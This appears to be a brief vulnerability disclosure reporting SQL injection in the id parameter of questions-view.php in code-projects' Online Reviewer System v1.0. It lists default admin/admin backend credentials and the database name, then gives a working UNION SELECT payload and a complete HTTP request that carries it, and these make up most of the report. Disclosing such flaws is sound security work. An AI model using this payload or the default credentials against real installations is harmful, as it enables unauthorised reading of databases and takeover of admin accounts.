# Online Reviewer System v1.0 by code-projects has SQL injection

Bug_author: wangxinyu

The password for the backend login account is: admin/admin

dbname= fbc_reviewer

vendors: https://code-projects.org/online-reviewer-system-in-php-with-source-code/

Vulnerability File: reviewer/system/system/admins/assessments/pretest/questions-view.php

Vulnerability location: /reviewer/system/system/admins/assessments/pretest/questions-view.php?id=, id

[+] Payload: ip/reviewer/system/system/admins/assessments/pretest/questions-view.php?id=151%27%20union%20select%201,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17--+

```sql
GET /reviewer/system/system/admins/assessments/pretest/questions-view.php?id=151%27%20union%20select%201,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=ivleqt3n6ncjlo4goroptbndau
Connection: close
```

<img width="1905" height="846" alt="image" src="https://github.com/user-attachments/assets/a8c64e47-09ae-4b30-8843-8f3ce0f73877" />
